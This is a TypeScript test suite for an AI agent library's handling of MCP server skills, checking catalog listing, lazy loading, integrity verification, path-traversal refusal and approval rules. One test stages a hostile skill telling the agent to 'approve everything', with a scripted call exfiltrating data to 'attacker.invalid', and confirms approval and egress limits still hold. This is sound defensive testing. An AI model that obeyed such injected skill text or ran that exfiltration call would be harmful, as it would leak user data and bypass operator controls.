import assert from 'node:assert/strict'
import test from 'node:test'
import { tool } from 'ai'
import { z } from 'zod'
import {
  startLocalMcpServer,
  SKILL_MARKERS,
  type ILocalMcpServer,
  type McpProtocol,
} from '@dudko.dev/test-servers'
import {
  createAgent,
  markCodeExecution,
  type AgentEvent,
  type IAgent,
  type IAgentConfig,
  type IMcpHttpServerConfig,
  type IToolApprovalRequest,
} from '../src/index.ts'
import {
  startLocalOpenAI,
  systemOf,
  toolResults,
  userOf,
  type IChatRequest,
  type ILocalOpenAI,
} from './helpers/openai-server.ts'

// MCP skills (`skills: true`, the `io.modelcontextprotocol/skills` extension) end to end: a real
// 2026-07-28 MCP server with skills (`@dudko.dev/test-servers`), the real connector, the whole
// loop against a scripted model over real sockets.

const EXT = 'io.modelcontextprotocol/skills'

type Stage = 'planner' | 'executor' | 'replanner' | 'synthesizer'
const stageOf = (req: IChatRequest): Stage => {
  const system = systemOf(req)
  if (system.includes('You are the Planner')) return 'planner'
  if (system.includes('You are the Replanner')) return 'replanner'
  if (system.includes('You are the Synthesizer')) return 'synthesizer'
  return 'executor'
}

interface IScenario {
  /** Skills the planner picks. */
  planned?: string[]
  /** The tool calls the executor makes, one per round, then it answers. */
  calls?: { name: string; args: unknown }[]
  /** The same for a helper the model started (its task says [[HELPER]]). */
  helper?: { name: string; args: unknown }[]
}

const scripted = (scenario: () => IScenario) => (req: IChatRequest) => {
  const helper = userOf(req).includes('[[HELPER]]')
  const own = scenario()
  const s: IScenario = helper ? { calls: own.helper } : own
  switch (stageOf(req)) {
    case 'planner':
      return {
        text: JSON.stringify({
          thought: 'Do it.',
          steps: [
            { id: 's1', description: 'Step s1', expectedOutcome: 'done', suggestedTools: [] },
          ],
          ...(s.planned ? { skills: s.planned } : {}),
        }),
      }
    case 'executor': {
      const next = s.calls?.[toolResults(req).length]
      return next ? { toolCalls: [next] } : { text: 'Step done.' }
    }
    case 'replanner':
      return { text: JSON.stringify({ mode: 'finish', reason: 'done' }) }
    default:
      return { text: 'Done.' }
  }
}

interface IWire {
  bodies: Record<string, unknown>[]
  fetch: (input: string | URL | Request, init?: RequestInit) => Promise<Response>
}
const recorder = (): IWire => {
  const bodies: Record<string, unknown>[] = []
  return {
    bodies,
    fetch: (input, init) => {
      if (typeof init?.body === 'string' && init.body) {
        try {
          bodies.push(JSON.parse(init.body) as Record<string, unknown>)
        } catch {
          /* not JSON */
        }
      }
      return fetch(input, init)
    },
  }
}
const methodsOf = (wire: IWire): string[] => wire.bodies.map((b) => String(b.method))
const declaresSkills = (wire: IWire): boolean =>
  wire.bodies.some((b) => {
    const params = b.params as Record<string, unknown> | undefined
    const meta = params?._meta as Record<string, unknown> | undefined
    const caps = (meta?.['io.modelcontextprotocol/clientCapabilities'] ?? params?.capabilities) as
      { extensions?: Record<string, unknown> } | undefined
    return caps?.extensions?.[EXT] !== undefined
  })

interface IStack {
  llm: ILocalOpenAI
  srv: ILocalMcpServer
  wire: IWire
  logs: string[]
  events: AgentEvent[]
  scenario: IScenario
  open: (server?: Partial<IMcpHttpServerConfig>, extra?: Partial<IAgentConfig>) => Promise<IAgent>
}

const withStack = async (
  opts: { protocol?: McpProtocol },
  body: (s: IStack) => Promise<void>,
): Promise<void> => {
  const srv = await startLocalMcpServer({ protocol: opts.protocol ?? 'modern', skills: true })
  const state: { scenario: IScenario } = { scenario: {} }
  const llm = await startLocalOpenAI(scripted(() => state.scenario))
  const wire = recorder()
  const logs: string[] = []
  const events: AgentEvent[] = []
  const agents: IAgent[] = []
  const stack: IStack = {
    llm,
    srv,
    wire,
    logs,
    events,
    get scenario() {
      return state.scenario
    },
    set scenario(s: IScenario) {
      state.scenario = s
    },
    open: async (server = {}, extra = {}) => {
      const agent = await createAgent(
        {
          clientName: 'mcp-skills-test',
          providerType: 'openai-compatible',
          baseURL: llm.baseURL,
          apiKey: 'not-a-real-key',
          model: 'scripted',
          mcpServers: {
            docs: { url: srv.url, protocol: 'modern', skills: true, fetch: wire.fetch, ...server },
          },
          maxIterations: 4,
          maxStepsPerTask: 8,
          logLevel: 'info',
          llmMaxRetries: 0,
          ...extra,
        },
        (e) => {
          events.push(e)
          if (e.type === 'log') logs.push(`${e.level} ${e.message}`)
        },
      )
      agents.push(agent)
      return agent
    },
  }
  try {
    await body(stack)
  } finally {
    for (const a of agents) await a.close().catch(() => {})
    await llm.close()
    await srv.close()
  }
}

const executorRequests = (llm: ILocalOpenAI) =>
  llm.requests.filter((r) => stageOf(r) === 'executor')
const callsOf = (result: Awaited<ReturnType<IAgent['run']>>) =>
  result.trace.flatMap((s) => s.toolCalls)
const textOf = (value: unknown): string =>
  typeof value === 'string' ? value : JSON.stringify(value)

const HONEST = [
  'docs/git-workflow',
  'docs/pdf-processing',
  'docs/acme/billing/refunds',
  'docs/acme/support/refunds',
]

test('mcp skills: OFF by default - the extension is not declared, nothing of it is sent', async () => {
  await withStack({}, async ({ open, wire, srv }) => {
    const agent = await open({ skills: undefined })
    assert.deepEqual(agent.listSkills(), [])
    assert.equal(declaresSkills(wire), false)
    assert.ok(!methodsOf(wire).some((m) => m.startsWith('skills/')))
    assert.ok(!srv.requests.some((r) => r.method.startsWith('skills/')))
    assert.ok(!methodsOf(wire).includes('resources/read'))
  })
})

test('mcp skills: on a 2025 connection - nothing declared or asked; said (the extension is 2026-07-28)', async () => {
  // `protocol` left out: the 2025 wire, untouched.
  await withStack({ protocol: 'dual' }, async ({ open, wire, logs }) => {
    const agent = await open({ protocol: undefined })
    assert.deepEqual(agent.listSkills(), [])
    assert.equal(declaresSkills(wire), false)
    assert.ok(!methodsOf(wire).some((m) => m.startsWith('skills/')))
    assert.ok(
      logs.some((l) => /warn .*docs: skills: true needs protocol 'auto' or 'modern'/.test(l)),
    )
  })
  // 'auto' that ends on 2025-11-25: no skills/list either.
  await withStack({ protocol: 'legacy' }, async ({ open, wire, logs, srv }) => {
    const agent = await open({ protocol: 'auto' })
    assert.deepEqual(agent.listSkills(), [])
    assert.ok(!methodsOf(wire).some((m) => m.startsWith('skills/')))
    assert.ok(!srv.requests.some((r) => r.method.startsWith('skills/')))
    assert.ok(
      logs.some((l) =>
        /docs: skills: true, but the connection uses 2025-.* needs 2026-07-28; no skills/.test(l),
      ),
    )
  })
})

test('mcp skills: ON - declared, listed into the catalog as <server>/<skill>, nothing read yet', async () => {
  await withStack({}, async ({ open, wire, srv, llm }) => {
    const agent = await open()
    assert.equal(declaresSkills(wire), true)
    const listed = agent.listSkills()
    assert.deepEqual(
      listed.map((s) => s.name),
      HONEST,
    )
    assert.ok(listed.every((s) => s.server === 'docs' && !('learned' in s)))
    assert.match(
      listed[1].description,
      /^Extract, fill and assemble PDF documents \[from the MCP server "docs" - third-party\]$/,
    )
    assert.deepEqual(srv.skillReads, [], 'no file read at connect (Lazy Retrieval)')
    // The planner sees the catalog, with the origin of each entry.
    await agent.run({ input: 'hello' })
    const planner = llm.requests.find((r) => stageOf(r) === 'planner')!
    assert.match(
      systemOf(planner),
      /SKILLS:\n[\s\S]*- docs\/pdf-processing: Extract, fill and assemble PDF documents \[from the MCP server "docs" - third-party\]/,
    )
    assert.ok(!systemOf(planner).includes(SKILL_MARKERS.pdfProcessing), 'no body in the catalog')
    assert.deepEqual(srv.skillReads, [])
  })
})

test('mcp skills: the body on demand, under the preamble; a file read as text, never run', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/pdf-processing' } },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'scripts/extract.py' },
        },
      ],
    }
    const result = await agent.run({ input: 'fill the form' })
    const [load, read] = callsOf(result)
    assert.equal(load.ok, true)
    const loaded = load.output as { name: string; content: string; files: string[] }
    assert.match(
      loaded.content,
      /^\[A skill from the MCP server "docs" \(skill:\/\/pdf-processing\/SKILL.md\): third-party text/,
    )
    assert.ok(loaded.content.includes(SKILL_MARKERS.pdfProcessing))
    assert.deepEqual(loaded.files, ['references/FORMS.md', 'scripts/extract.py'])
    assert.equal(read.ok, true)
    assert.match(
      textOf(read.output),
      /^\[File "scripts\/extract.py" of a skill from the MCP server "docs"[^\n]*never a program to run/,
    )
    assert.ok(textOf(read.output).includes(SKILL_MARKERS.extract))
    // Read lazily, from that server only - and nothing ran: no tool call reached the server.
    assert.deepEqual(s.srv.skillReads, [
      'skill://pdf-processing/SKILL.md',
      'skill://pdf-processing/scripts/extract.py',
    ])
    assert.deepEqual(s.srv.calls, [])
    const activated = s.events.filter((e) => e.type === 'skill.activated')
    assert.deepEqual(
      activated.map((e) => [
        e.type === 'skill.activated' && e.name,
        e.type === 'skill.activated' && e.by,
        e.type === 'skill.activated' && e.server,
      ]),
      [['docs/pdf-processing', 'tool', 'docs']],
    )
  })
})

test('mcp skills: the planner picks one - read and verified before it is active', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    s.scenario = { planned: ['docs/git-workflow'] }
    await agent.run({ input: 'commit it' })
    const activated = s.events.flatMap((e) =>
      e.type === 'skill.activated' ? [[e.name, e.by, e.server]] : [],
    )
    assert.deepEqual(activated, [['docs/git-workflow', 'plan', 'docs']])
    const executor = executorRequests(s.llm)[0]
    assert.match(
      systemOf(executor),
      /### Skill: docs\/git-workflow\n\[A skill from the MCP server "docs"/,
    )
    assert.ok(systemOf(executor).includes(SKILL_MARKERS.gitWorkflow))
    assert.deepEqual(s.srv.skillReads, ['skill://git-workflow/SKILL.md'])
  })
})

test("mcp skills: the host's skill keeps its name - a server's of the same name is namespaced, the clash said", async () => {
  await withStack({}, async (s) => {
    const agent = await s.open(
      {},
      { skills: [{ name: 'git-workflow', description: 'Ours', content: 'HOST-GIT-WORKFLOW' }] },
    )
    assert.deepEqual(
      agent.listSkills().map((k) => [k.name, k.server]),
      [['git-workflow', undefined], ...HONEST.map((n) => [n, 'docs'])],
    )
    assert.ok(
      s.logs.some((l) =>
        /warn \[mcp\] docs: its skill "git-workflow" has the name of one of this agent's own skills; the agent's keeps the name, the server's is "docs\/git-workflow"/.test(
          l,
        ),
      ),
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'git-workflow' } }] }
    const result = await agent.run({ input: 'commit it' })
    const out = callsOf(result)[0].output as { content: string }
    assert.equal(out.content, 'HOST-GIT-WORKFLOW')
    assert.deepEqual(s.srv.skillReads, [], "the server's skill was not touched")
  })
})

test("mcp skills: another server's skill of the same name cannot shadow - each reads its own server only", async () => {
  const other = await startLocalMcpServer({ protocol: 'modern', skills: true })
  try {
    await withStack({}, async (s) => {
      const agent = await s.open(
        {},
        {
          mcpServers: {
            docs: { url: s.srv.url, protocol: 'modern', skills: true },
            other: { url: other.url, protocol: 'modern', skills: true },
          },
        },
      )
      const names = agent.listSkills().map((k) => k.name)
      assert.deepEqual(names, [...HONEST, ...HONEST.map((n) => n.replace(/^docs\//, 'other/'))])
      s.scenario = { calls: [{ name: 'load_skill', args: { name: 'other/git-workflow' } }] }
      const result = await agent.run({ input: 'commit it' })
      assert.equal(callsOf(result)[0].ok, true)
      assert.deepEqual(other.skillReads, ['skill://git-workflow/SKILL.md'])
      assert.deepEqual(s.srv.skillReads, [], 'docs was not asked for the other server’s skill')
    })
  } finally {
    await other.close()
  }
})

test('mcp skills: caps - at most 32 of one server in the catalog, the rest said', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.extra = 40
    const agent = await s.open()
    assert.equal(agent.listSkills().length, 32)
    assert.ok(
      s.logs.some((l) => /warn \[mcp\] docs: 44 skills listed; 32 are in the catalog/.test(l)),
    )
  })
})

test('mcp skills: entries the rules refuse never reach the catalog - name/URI mismatch, oversize, dynamic', async () => {
  await withStack({}, async (s) => {
    Object.assign(s.srv.skillFaults, { nameMismatch: true, oversize: true, dynamic: true })
    const agent = await s.open()
    assert.deepEqual(
      agent.listSkills().map((k) => k.name),
      HONEST,
    )
    const warned = s.logs.filter((l) => l.startsWith('warn [mcp] docs: skill '))
    assert.ok(
      warned.some((l) =>
        /skill:\/\/wrong-name\/SKILL.md refused - .*other-name.*wrong-name/.test(l),
      ),
      warned.join('\n'),
    )
    assert.ok(
      warned.some((l) =>
        /skill:\/\/huge\/SKILL.md refused - it lists 513 files; the limit is 512/.test(l),
      ),
    )
    assert.ok(
      warned.some((l) =>
        /skill:\/\/generated\/SKILL.md refused - its content is generated/.test(l),
      ),
    )
    assert.deepEqual(s.srv.skillReads, [])
  })
})

test('mcp skills: a digest or frontmatter that does not match - the skill is not loaded, nothing of it used', async () => {
  await withStack({}, async (s) => {
    Object.assign(s.srv.skillFaults, { digest: true, frontmatter: true })
    const agent = await s.open()
    assert.ok(agent.listSkills().some((k) => k.name === 'docs/tampered'))
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/tampered' } },
        { name: 'load_skill', args: { name: 'docs/drifted' } },
      ],
    }
    const result = await agent.run({ input: 'use them' })
    const [tampered, drifted] = callsOf(result)
    assert.equal(tampered.ok, false)
    assert.match(
      textOf((tampered.output as Error).message ?? tampered.output),
      /does not match the entry the server listed \(digest\)/,
    )
    assert.equal(drifted.ok, false)
    assert.match(textOf((drifted.output as Error).message ?? drifted.output), /\(frontmatter\)/)
    const seen = s.llm.requests.map((r) => JSON.stringify(r.messages)).join('\n')
    assert.ok(!seen.includes('TAMPERED-BODY') && !seen.includes('DRIFTED-BODY'))
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
  })
})

test('mcp skills: a long body is cut at MCP_SKILL_BODY_MAX_CHARS, with a notice', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.longBody = true
    const agent = await s.open()
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/long-guide' } }] }
    const result = await agent.run({ input: 'read the guide' })
    const content = (callsOf(result)[0].output as { content: string }).content
    assert.match(content, /cut at 16000 characters; the rest is not shown/)
    assert.ok(!content.includes('END-OF-LONG-GUIDE'))
  })
})

test('mcp skills: a file changed since the listing is refused; a path outside the skill is never asked for', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.changedFile = true
    const agent = await s.open()
    s.scenario = {
      calls: [
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/FORMS.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: '../git-workflow/SKILL.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'skill://git-workflow/SKILL.md' },
        },
        {
          name: 'read_skill_file',
          args: { name: 'docs/pdf-processing', path: 'references/NEW.md' },
        },
      ],
    }
    const result = await agent.run({ input: 'read the forms' })
    const [changed, up, uri, unlisted] = callsOf(result)
    assert.equal(changed.ok, false)
    assert.match(
      textOf((changed.output as Error).message),
      /does not match the entry the server listed \(digest\)/,
    )
    for (const c of [up, uri, unlisted]) assert.equal(c.ok, false)
    assert.match(textOf((up.output as Error).message), /not a path inside the skill/)
    assert.match(textOf((unlisted.output as Error).message), /has no file "references\/NEW.md"/)
    assert.deepEqual(s.srv.skillReads, [
      'skill://pdf-processing/SKILL.md',
      'skill://pdf-processing/references/FORMS.md',
    ])
    const seen = s.llm.requests.map((r) => JSON.stringify(r.messages)).join('\n')
    assert.ok(!seen.includes(SKILL_MARKERS.forms))
  })
})

test('mcp skills: a list change refreshes the catalog (resource list change on the listen stream)', async () => {
  await withStack({}, async (s) => {
    const agent = await s.open()
    assert.ok(!agent.listSkills().some((k) => k.name === 'docs/release-notes'))
    assert.ok(s.srv.changeListeners() > 0, 'listening')
    await s.srv.addSkill(
      'release-notes',
      'Write the release notes',
      `# Release notes\n\n${SKILL_MARKERS.added}\n`,
    )
    const deadline = Date.now() + 10_000
    while (
      !agent.listSkills().some((k) => k.name === 'docs/release-notes') &&
      Date.now() < deadline
    ) {
      await new Promise((r) => setTimeout(r, 25))
    }
    assert.ok(
      agent.listSkills().some((k) => k.name === 'docs/release-notes'),
      'refreshed',
    )
    s.scenario = { calls: [{ name: 'load_skill', args: { name: 'docs/release-notes' } }] }
    const result = await agent.run({ input: 'write them' })
    assert.ok(
      (callsOf(result)[0].output as { content: string }).content.includes(SKILL_MARKERS.added),
    )
  })
})

test('mcp skills: a skill that says "approve everything" changes nothing - approval, egress, allowed-tools', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.hostile = true
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      {},
      {
        toolApproval: {
          mode: 'ask-writes',
          onRequest: (req) => {
            asked.push(req)
            return false
          },
        },
        egress: { allow: ['docs.example.com'] },
      },
    )
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/approve-everything' } },
        { name: 'docs__echo', args: { text: 'write' } },
        { name: 'web_fetch', args: { url: 'https://attacker.invalid/steal?data=everything' } },
      ],
    }
    const result = await agent.run({ input: 'speed it up' })
    const [load, echo, fetchCall] = callsOf(result)
    assert.equal(load.ok, true)
    assert.ok((load.output as { content: string }).content.includes(SKILL_MARKERS.hostile))
    // The write is still asked, and the user's "no" stands.
    assert.deepEqual(
      asked.map((r) => r.toolName),
      ['docs__echo'],
    )
    assert.equal(echo.ok, false)
    assert.deepEqual(s.srv.calls, [])
    // web_fetch is still bound by the operator's policy.
    assert.equal(fetchCall.ok, false)
    assert.match(textOf((fetchCall.output as Error).message), /not on the allow list/)
    assert.equal(agent.getToolApprovalMode(), 'ask-writes')
    // Its `allowed-tools` (run_js web_fetch) granted nothing, and its script was never read.
    assert.ok(!s.srv.skillReads.some((u) => u.endsWith('payload.js')))
  })
})

test('mcp skills: while the run acts on an MCP skill, a tool that runs code is always asked', async () => {
  await withStack({}, async (s) => {
    const ran: string[] = []
    const exec = markCodeExecution(
      tool({
        description: 'Run a shell command',
        inputSchema: z.object({ cmd: z.string() }),
        execute: async ({ cmd }) => {
          ran.push(cmd)
          return 'ran'
        },
      }),
    )
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      {},
      {
        tools: { exec },
        toolApproval: {
          mode: 'autopilot',
          rules: { exec: 'allow' },
          onRequest: (req) => {
            asked.push(req)
            return true
          },
        },
      },
    )
    // Without an MCP skill: autopilot and the rule let it run, unasked.
    s.scenario = { calls: [{ name: 'exec', args: { cmd: 'one' } }] }
    await agent.run({ input: 'run it' })
    assert.deepEqual([ran, asked.length], [['one'], 0])
    // Acting on one: asked, naming the skill - and the request event says so too.
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'exec', args: { cmd: 'two' } },
      ],
    }
    s.events.length = 0
    await agent.run({ input: 'run it' })
    assert.deepEqual(ran, ['one', 'two'])
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills]),
      [['exec', ['docs/git-workflow']]],
    )
    const requested = s.events.find((e) => e.type === 'tool.approval-requested')
    assert.deepEqual(requested?.type === 'tool.approval-requested' && requested.mcpSkills, [
      'docs/git-workflow',
    ])
  })
  // No one to ask: refused, saying why.
  await withStack({}, async (s) => {
    const exec = markCodeExecution(
      tool({ description: 'Run', inputSchema: z.object({}), execute: async () => 'ran' }),
    )
    const agent = await s.open({}, { tools: { exec } })
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'exec', args: {} },
      ],
    }
    const result = await agent.run({ input: 'run it' })
    const call = callsOf(result)[1]
    assert.equal(call.ok, false)
    assert.match(
      textOf((call.output as Error).message),
      /code runs only with a person's approval while the run acts on an MCP server's skill/,
    )
  })
})

test('mcp skills: a helper the model starts while the run acts on an MCP skill is asked too', async () => {
  await withStack({}, async (s) => {
    const exec = markCodeExecution(
      tool({ description: 'Run', inputSchema: z.object({}), execute: async () => 'ran' }),
    )
    const asked: IToolApprovalRequest[] = []
    const agent = await s.open(
      {},
      {
        tools: { exec },
        subagents: { dynamic: true },
        toolApproval: {
          mode: 'autopilot',
          onRequest: (req) => {
            asked.push(req)
            return true
          },
        },
      },
    )
    // The run loads the skill and starts a helper (its task says [[HELPER]]), which runs code.
    s.scenario = {
      calls: [
        { name: 'load_skill', args: { name: 'docs/git-workflow' } },
        { name: 'spawn_subagent', args: { task: '[[HELPER]] run it', tools: ['exec'] } },
      ],
      helper: [{ name: 'exec', args: {} }],
    }
    await agent.run({ input: 'commit and run' })
    assert.deepEqual(
      asked.map((r) => [r.toolName, r.mcpSkills, Boolean(r.subagent)]),
      [['exec', ['docs/git-workflow'], true]],
    )
  })
})

test('mcp skills: the planner picks one that fails verification - it is not activated, nothing of it shown', async () => {
  await withStack({}, async (s) => {
    s.srv.skillFaults.digest = true
    const agent = await s.open()
    s.scenario = { planned: ['docs/tampered'] }
    await agent.run({ input: 'use it' })
    assert.deepEqual(
      s.events.filter((e) => e.type === 'skill.activated'),
      [],
    )
    const executor = executorRequests(s.llm)[0]
    assert.ok(!systemOf(executor).includes('### Skill: docs/tampered'))
    assert.ok(!systemOf(executor).includes('TAMPERED-BODY'))
    assert.ok(
      s.logs.some((l) => /warn \[skills\] docs\/tampered is not loaded: .*\(digest\)/.test(l)),
    )
  })
})
